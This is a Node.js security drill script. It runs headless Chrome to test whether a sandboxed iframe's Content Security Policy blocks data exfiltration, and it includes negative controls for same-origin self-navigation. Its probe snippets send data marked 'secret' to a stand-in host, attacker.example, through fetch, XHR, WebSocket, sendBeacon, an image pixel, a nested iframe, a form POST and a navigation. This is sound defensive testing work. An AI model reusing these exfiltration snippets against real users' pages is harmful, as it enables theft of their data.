#!/usr/bin/env node
// m3-csp-drill.mjs — the adversarial live drill for the M3 per-frame CSP
// (`src/security/m3Csp.ts`, UI_AS_APPS_SPEC §G1a / TRUST_MODES_SPEC §6, R3-234).
//
// `src/security/m3Csp.test.ts` proves the POLICY is the one we meant to write and
// that the document and the hosting config carry it. Only a browser can prove the
// policy DOES anything, so this drives the real built `dist/m3.html` in real
// Chrome, framed exactly the way the host frames an M3 app (the R3-195 sandbox
// flags: `allow-scripts allow-downloads allow-pointer-lock`, empty `allow`), and
// attacks it from the inside.
//
//   npm run build          # dist/m3.html must exist
//   npm run drill:m3-csp   # needs Chrome + puppeteer-core (neither is a repo dep)
//
// Kept in the repo rather than run once and described in a PR, because the thing
// it protects is a policy string that any future CDN change can silently break
// (ways_of_working §3: the harness is reusable infrastructure).
//
// WHAT IT ASSERTS
//   blocked  — fetch / XHR / WebSocket / sendBeacon to an attacker origin
//   blocked  — <img> pixel exfil, nested-frame GET, native form POST
//   blocked  — the module CDN OUTSIDE its two allowlisted paths (path scoping)
//   allowed  — the bundler's own module origins, the frame's own origin, and the
//              SDK MessagePort (not CSP-governed — the control assertion)
//   OBSERVED, NOT BLOCKED — frame self-navigation to an EXTERNAL origin. That is
//              the booked browser-parity residual (finding C1); the drill fails
//              if it ever starts claiming otherwise.
//   blocked  — R3-353: egress after a SAME-ORIGIN self-navigation. The policy is
//              a property of the hardened ORIGIN (a Hosting header on `**`), not
//              of one filename, so re-birthing the frame at another path there
//              lands it on a document that is still contained. Drilled with a
//              landing document carrying NO policy of its own, plus the negative
//              control on a policy-free origin — otherwise "blocked" could mean
//              "the probe never ran".
//   404      — R3-354: an unknown `*.html`. The old SPA rewrite fabricated the
//              policy-free baseline document for any non-js path, so a missing
//              `m3.html` served every M3 frame an uncontained document with no
//              error anywhere.
//
// WHAT THIS DRILL CANNOT SEE: the host-side half of R3-353 — a frame that
// navigates CROSS-origin is refused re-registration by the sandpack client
// (`InitializationGuard`), so it keeps no fs port and no grants. That lives in
// the host, is unit-tested there, and is invisible from inside the frame.
//
// The CORS header this server sends mirrors the prod Hosting config: the frame is
// an opaque origin, so it sends `Origin: null` and without `ACAO: *` every
// subresource dies on CORS before CSP is ever consulted — which reads exactly
// like a CSP failure and sent one earlier debugging pass down the wrong path.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const DIST = process.argv[2] || join(dirname(fileURLToPath(import.meta.url)), '..', 'dist');
const PORT = Number(process.env.DRILL_PORT || 8791);
const M3_SANDBOX_FLAGS = 'allow-scripts allow-downloads allow-pointer-lock';

// puppeteer-core is deliberately NOT a repo dependency (it would ride along into
// every install for a drill almost nobody runs). Install it anywhere and point
// PUPPETEER_CORE at the module, or install it globally.
let puppeteer;
for (const spec of ['puppeteer-core', process.env.PUPPETEER_CORE].filter(Boolean)) {
  try {
    puppeteer = (await import(spec)).default;
    break;
  } catch {
    /* try the next */
  }
}
if (!puppeteer) {
  console.error(
    '❌ needs puppeteer-core. Either `npm i -g puppeteer-core`, or:\n' +
      '     mkdir -p /tmp/drv && cd /tmp/drv && npm i puppeteer-core\n' +
      '     PUPPETEER_CORE=/tmp/drv/node_modules/puppeteer-core/lib/puppeteer/puppeteer-core.js npm run drill:m3-csp',
  );
  process.exit(2);
}
const CHROME = process.env.CHROME_PATH || '/usr/bin/google-chrome';
if (!fs.existsSync(join(DIST, 'm3.html'))) {
  console.error(`❌ no ${join(DIST, 'm3.html')} — run \`npm run build\` first`);
  process.exit(2);
}

const m3 = fs.readFileSync(join(DIST, 'm3.html'), 'utf8');
/** `m3.html` verbatim + an inline reporter. Inline script is policy-permitted on
 *  purpose (parcel's import map needs `'unsafe-inline'`), so the attacks below
 *  run under the exact bytes production serves. */
const probeDoc = (body) =>
  m3.replace(
    '</body>',
    `<script>
const out = { violations: [], results: {} };
document.addEventListener('securitypolicyviolation', (e) =>
  out.violations.push({ directive: e.effectiveDirective || e.violatedDirective, blocked: e.blockedURI }));
const record = async (name, fn) => {
  try { out.results[name] = { ok: true, value: await fn() }; }
  catch (e) { out.results[name] = { ok: false, error: String((e && e.message) || e) }; }
};
window.addEventListener('message', async (ev) => {
  if (ev.data !== 'run') return;
  const port = ev.ports && ev.ports[0];
  ${body}
  await new Promise((r) => setTimeout(r, 600));
  window.parent.postMessage({ probe: out }, '*');
});
</script></body>`,
  );

const MAIN = `
  await record('fetchAttacker', () => fetch('https://attacker.example/x?d=secret').then((r) => r.status));
  await record('xhrAttacker', () => new Promise((res, rej) => {
    const x = new XMLHttpRequest();
    x.onerror = () => rej(new Error('blocked')); x.onload = () => res(x.status);
    x.open('GET', 'https://attacker.example/x'); x.send();
  }));
  await record('websocket', () => { new WebSocket('wss://attacker.example/'); return 'constructed'; });
  await record('beacon', () => navigator.sendBeacon('https://attacker.example/b', 'x'));
  await record('pixel', () => new Promise((res) => {
    const i = new Image();
    i.onload = () => res('loaded'); i.onerror = () => res('error');
    i.src = 'https://attacker.example/p.gif?d=secret';
    setTimeout(() => res('timeout'), 1500);
  }));
  await record('nestedFrame', () => {
    const fr = document.createElement('iframe');
    fr.src = 'https://attacker.example/n?d=secret'; document.body.appendChild(fr); return 'appended';
  });
  await record('fetchSelf', () => fetch('/index.html').then((r) => r.status));
  await record('fetchDepTree', () => fetch('https://sandpack-cdn-staging.blazingly.io/dep_tree/probe').then((r) => r.status));
  await record('fetchCdnRoot', () => fetch('https://sandpack-cdn-staging.blazingly.io/?d=secret').then((r) => r.status));
  out.results.entryScript = { loaded: performance.getEntriesByType('resource').some((r) => new URL(r.name).pathname.endsWith('.js')) };
  await record('messagePort', () => new Promise((res) => {
    if (!port) return res('no-port');
    port.onmessage = (m) => res('echo:' + m.data);
    port.postMessage('ping');
    setTimeout(() => res('no-reply'), 1000);
  }));
`;
const FORM = `
  const f = document.createElement('form');
  f.method = 'POST'; f.action = 'https://attacker.example/f'; f.target = '_self';
  document.body.appendChild(f); f.submit();
`;
const NAV = `location.href = 'https://attacker.example/?d=secret';`;
// R3-353. The self-navigation the finding describes, in its first form:
// `location.href = '/index.html'` — the frame re-births itself at a SAME-ORIGIN
// document whose policy it does not control. `__drill_landing.html` stands in
// for `index.html` (a real, policy-free document on this origin) because it can
// report back; the real `/index.html` is checked separately by `fetchPath`, and
// the finding's second form — an extensionless path resolved by the SPA rewrite
// — by `appRouteHardened`.
const SELF_NAV = `location.href = '/__drill_landing.html';`;

const docs = { main: MAIN, form: FORM, nav: NAV, selfnav: SELF_NAV };
for (const [name, body] of Object.entries(docs)) fs.writeFileSync(join(DIST, `__drill_${name}.html`), probeDoc(body));

/**
 * The document the self-navigation LANDS on — deliberately carrying **no meta
 * CSP of its own**, so it stands in for the policy-free baseline document. If an
 * attacker fetch is blocked here, the containment came from the ORIGIN (the
 * Hosting header on `**`) and not from the document, which is exactly the
 * property R3-353's origin separation buys.
 */
/**
 * The probe the landing document runs. THE SIGNAL IS THE VIOLATION EVENT, not
 * whether the fetch settled: the drill runs under puppeteer request
 * interception, which ABORTS every attacker request, so the promise rejects on
 * BOTH origins and "did the fetch fail?" would report containment where there is
 * none. A `connect-src` violation only fires when a policy actually refused it.
 */
const LANDING_PROBE = [
  '<script>',
  'const out = { violations: [], results: {} };',
  "document.addEventListener('securitypolicyviolation', (e) =>",
  '  out.violations.push({ directive: e.effectiveDirective || e.violatedDirective, blocked: e.blockedURI }));',
  'out.results.landingHasOwnPolicy = !!document.querySelector(\'meta[http-equiv="Content-Security-Policy"]\');',
  "fetch('https://attacker.example/exfil?d=secret').catch(() => {});",
  'setTimeout(() => {',
  '  out.results.landingBlocked = out.violations.some(',
  "    (v) => v.directive === 'connect-src' && v.blocked.includes('attacker.example'),",
  '  );',
  "  parent.postMessage({ probe: out }, '*');",
  '}, 600);',
  '</scr' + 'ipt>',
].join('\n');

const landingDoc = m3
  // `[^>]*>` on purpose: parcel emits the built meta WITHOUT a self-closing
  // slash, so a `…\/>` pattern silently fails to strip it — and a landing
  // document that kept its own policy would make this drill assert nothing.
  // (It did exactly that on the first run; the negative control is what caught it.)
  .replace(/<meta\s+http-equiv="Content-Security-Policy"[^>]*>/i, '')
  .replace('</body>', LANDING_PROBE + '</body>');

fs.writeFileSync(join(DIST, '__drill_landing.html'), landingDoc);

const parentHtml = (doc, flags, withPort) => `<!doctype html><meta charset=utf-8><body><script>
const f = document.createElement('iframe');
f.setAttribute('sandbox', ${JSON.stringify(`${M3_SANDBOX_FLAGS} ${flags}`.trim())});
f.setAttribute('allow', '');
f.src = '/__drill_${doc}.html';
f.onload = () => {
  window.__loads = (window.__loads || 0) + 1;
  ${
    withPort
      ? `const ch = new MessageChannel();
         ch.port1.onmessage = (m) => ch.port1.postMessage('pong:' + m.data);
         try { f.contentWindow.postMessage('run', '*', [ch.port2]); } catch (e) {}`
      : `try { f.contentWindow.postMessage('run', '*'); } catch (e) {}`
  }
};
window.addEventListener('message', (e) => { if (e.data && e.data.probe) window.__probe = e.data.probe; });
document.body.appendChild(f);
</script>`;

/**
 * A stand-in for ONE Firebase Hosting site (R3-353). Two are started below on
 * two ports — different ports are different origins, which is the whole point:
 *
 *  - the **hardened** origin mirrors the `…-m3` site: the M3 policy on EVERY
 *    path (`headers: [{ source: '**' }]`) and extensionless routes rewritten to
 *    the hardened document;
 *  - the **baseline** origin mirrors the existing site: no policy, extensionless
 *    routes rewritten to `index.html`.
 *
 * Both refuse to fabricate a document for an unknown `*.html` — the tightened
 * `**\/!(*.@(js|js.map|html))` rewrite, which is what turns a missing `m3.html`
 * into a 404 instead of a silent policy-free boot (R3-354).
 *
 * `/parent` is exempt from the policy header on purpose: it stands in for the
 * HOST page, which in production lives on site-main's origin, not this one.
 */
const makeServer = ({ csp, spaDestination }) =>
  http.createServer((req, res) => {
    const url = new URL(req.url, 'http://x');
    if (url.pathname === '/parent') {
      res.writeHead(200, { 'content-type': 'text/html' });
      return res.end(
        parentHtml(
          url.searchParams.get('doc'),
          url.searchParams.get('flags') || '',
          url.searchParams.get('port') === '1',
        ),
      );
    }
    let file = path.join(DIST, url.pathname.slice(1));
    if (!file.startsWith(DIST)) {
      res.writeHead(404);
      return res.end('nope');
    }
    if (!fs.existsSync(file) || fs.statSync(file).isDirectory()) {
      // The SPA rewrite — and its exclusions. A `.js`/`.js.map`/`.html` path that
      // does not exist is a real 404; anything else resolves to the document this
      // origin serves for app routes.
      if (/\.(js|js\.map|html)$/.test(url.pathname)) {
        res.writeHead(404);
        return res.end('nope');
      }
      file = path.join(DIST, spaDestination);
      if (!fs.existsSync(file)) {
        res.writeHead(404);
        return res.end('nope');
      }
    }
    const ext = path.extname(file);
    res.writeHead(200, {
      'content-type': ext === '.js' ? 'text/javascript' : 'text/html',
      'access-control-allow-origin': '*',
      ...(csp ? { 'content-security-policy': csp } : {}),
    });
    res.end(fs.readFileSync(file));
  });

/** The policy the hardened origin serves — read out of the built document, so the
 *  drill can never test a policy the artifact does not actually carry. */
const HARDENED_CSP = (/<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]*)"/i.exec(m3) || [])[1];
if (!HARDENED_CSP) {
  console.error('❌ dist/m3.html carries no CSP meta — nothing to drill');
  process.exit(2);
}
const BASELINE_PORT = PORT + 1;
const server = makeServer({ csp: HARDENED_CSP, spaDestination: 'm3.html' });
const baselineServer = makeServer({ csp: null, spaDestination: 'index.html' });
await new Promise((r) => server.listen(PORT, '127.0.0.1', r));
await new Promise((r) => baselineServer.listen(BASELINE_PORT, '127.0.0.1', r));

const browser = await puppeteer.launch({
  executablePath: CHROME,
  headless: 'new',
  args: ['--no-sandbox', '--disable-dev-shm-usage'],
});
const run = async (doc, { flags = '', port = false, wait, origin = PORT } = {}) => {
  const page = await browser.newPage();
  const requests = [];
  await page.setRequestInterception(true);
  page.on('request', (r) => {
    requests.push(r.url());
    r.url().includes('attacker.example') ? r.abort() : r.continue();
  });
  await page.goto(`http://127.0.0.1:${origin}/parent?doc=${doc}&flags=${flags}&port=${port ? 1 : 0}`, {
    waitUntil: 'load',
  });
  try {
    await page.waitForFunction(wait, { timeout: 15000 });
  } catch {
    /* nav drills never report back */
  }
  const probe = await page.evaluate('window.__probe');
  const frames = page.frames().map((f) => f.url());
  await page.close();
  return { probe, frames, attackerRequests: requests.filter((u) => u.includes('attacker.example')) };
};

const main = await run('main', { port: true, wait: 'window.__probe !== undefined' });
const form = await run('form', { flags: 'allow-forms', wait: 'window.__probe !== undefined' });
const nav = await run('nav', { wait: 'window.__loads > 1 || window.__probe !== undefined' });
// R3-353 — the SAME-ORIGIN self-navigation, run against BOTH origins. The
// hardened one must contain the landing document; the baseline one must NOT.
// Running the negative control matters as much as the positive: without it a
// bug that blocked the fetch for some unrelated reason (an aborted request, a
// probe that never ran) would read as containment.
const selfNavHardened = await run('selfnav', { wait: 'window.__probe !== undefined' });
const selfNavBaseline = await run('selfnav', { wait: 'window.__probe !== undefined', origin: BASELINE_PORT });

/** What each origin answers for a path — the rewrite behaviour, R3-353/R3-354. */
const fetchPath = async (origin, pathname) => {
  const page = await browser.newPage();
  const res = await page.goto(`http://127.0.0.1:${origin}${pathname}`).catch(() => null);
  const status = res ? res.status() : 0;
  // Read the POLICY OFF THE RESPONSE HEADERS, not out of the body: the question
  // is whether the ORIGIN attached it, and a document that carries its own
  // `<meta>` would otherwise answer "yes" for the wrong reason.
  const headerPolicy = res ? res.headers()['content-security-policy'] ?? null : null;
  await page.close();
  return { status, headerPolicy };
};
const missingHtmlHardened = await fetchPath(PORT, '/doesnotexist.html');
const missingHtmlBaseline = await fetchPath(BASELINE_PORT, '/doesnotexist.html');
const appRouteHardened = await fetchPath(PORT, '/some/app/route');
// The finding's literal first bullet: `location.href = '/index.html'`. On the
// hardened origin that document must still arrive under the policy; on the
// baseline origin it must not (the control that proves the header is doing it).
const baselineDocOnHardened = await fetchPath(PORT, '/index.html');
const baselineDocOnBaseline = await fetchPath(BASELINE_PORT, '/index.html');

await browser.close();
server.close();
baselineServer.close();
for (const name of Object.keys(docs)) fs.rmSync(join(DIST, `__drill_${name}.html`), { force: true });
fs.rmSync(join(DIST, '__drill_landing.html'), { force: true });

const violated = (r, directive, needle) =>
  (r.probe?.violations ?? []).some((v) => v.directive === directive && v.blocked.includes(needle));
const results = main.probe?.results ?? {};
const checks = [
  ['fetch to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'attacker.example/x?d=secret')],
  ['XHR to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'attacker.example/x')],
  ['WebSocket to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'wss://attacker.example')],
  ['sendBeacon to an attacker origin is CSP-blocked', violated(main, 'connect-src', 'attacker.example/b')],
  ['pixel exfil is CSP-blocked (img-src)', violated(main, 'img-src', 'attacker.example/p.gif')],
  ['nested-frame GET is CSP-blocked (frame-src)', violated(main, 'frame-src', 'attacker.example')],
  [
    'the module CDN is reachable ONLY on its allowlisted paths',
    violated(main, 'connect-src', 'blazingly.io/?d=secret'),
  ],
  [
    'native form POST is CSP-blocked (form-action, isolated from the sandbox flag)',
    violated(form, 'form-action', 'attacker.example/f'),
  ],
  ['no attacker request escaped the frame', main.attackerRequests.length === 0 && form.attackerRequests.length === 0],
  // Controls — an M3 app must still BOOT AND RUN.
  ["the frame's own origin stays fetchable ('self' resolves in an opaque origin)", results.fetchSelf?.value === 200],
  ['dependency resolution (/dep_tree/) is allowed', results.fetchDepTree?.ok === true],
  ["the bundler's entry module loads (script-src)", results.entryScript?.loaded === true],
  ['the SDK MessagePort is unaffected (not CSP-governed)', results.messagePort?.value === 'echo:pong:ping'],
  // The booked residual — asserted as OBSERVED, never as prevented. A frame can
  // always navigate itself to an attacker origin; CSP3 dropped `navigate-to`.
  // What R3-353 changes is what happens NEXT, not whether the GET leaves.
  ['self-navigation is NOT blocked (booked residual, §G1a / C1)', nav.attackerRequests.length > 0],

  // ── R3-353: the containment survives a SAME-ORIGIN self-navigation ─────────
  // The finding: the M3 policy travelled with the birth URL, so re-birthing at
  // any other path on the same origin restored unrestricted `connect-src`. The
  // landing document deliberately carries NO policy of its own, so a refusal
  // here can only have come from the origin.
  [
    'after a same-origin self-navigation, egress is STILL contained (hardened origin)',
    selfNavHardened.probe?.results?.landingBlocked === true,
  ],
  [
    'the landing document carries NO policy of its own — the ORIGIN contained it',
    selfNavHardened.probe?.results?.landingHasOwnPolicy === false,
  ],
  [
    'NEGATIVE CONTROL: the same navigation on a policy-free origin is NOT contained',
    selfNavBaseline.probe?.results?.landingBlocked === false &&
      selfNavBaseline.probe?.results?.landingHasOwnPolicy === false,
  ],
  [
    'NEGATIVE CONTROL: and the attacker request DOES leave the frame there',
    selfNavBaseline.attackerRequests.some((u) => u.includes('/exfil')),
  ],
  [
    'no attacker request escaped the hardened origin after self-navigation',
    !selfNavHardened.attackerRequests.some((u) => u.includes('/exfil')),
  ],
  [
    'the hardened origin resolves an app route to a document that carries the policy',
    appRouteHardened.status === 200 && appRouteHardened.headerPolicy === HARDENED_CSP,
  ],
  [
    "the baseline DOCUMENT served from the hardened origin carries the policy too ('/index.html')",
    baselineDocOnHardened.status === 200 && baselineDocOnHardened.headerPolicy === HARDENED_CSP,
  ],
  [
    'NEGATIVE CONTROL: the same document on the baseline origin carries no policy',
    baselineDocOnBaseline.status === 200 && baselineDocOnBaseline.headerPolicy === null,
  ],
  // ── R3-354: a missing document 404s instead of being fabricated ────────────
  ['an unknown *.html 404s on the hardened origin (no fabricated document)', missingHtmlHardened.status === 404],
  ['an unknown *.html 404s on the baseline origin too', missingHtmlBaseline.status === 404],
];

let failed = 0;
for (const [label, ok] of checks) {
  if (!ok) failed++;
  console.log(`${ok ? '✅' : '❌'} ${label}`);
}
if (failed) {
  console.error(
    `\n${failed} check(s) failed. Raw:\n${JSON.stringify(
      {
        main,
        form,
        nav,
        selfNavHardened,
        selfNavBaseline,
        missingHtmlHardened,
        missingHtmlBaseline,
        appRouteHardened,
        baselineDocOnHardened,
        baselineDocOnBaseline,
      },
      null,
      2,
    )}`,
  );
  process.exit(1);
}
console.log(`\n✅ M3 CSP drill passed — ${checks.length} checks.`);
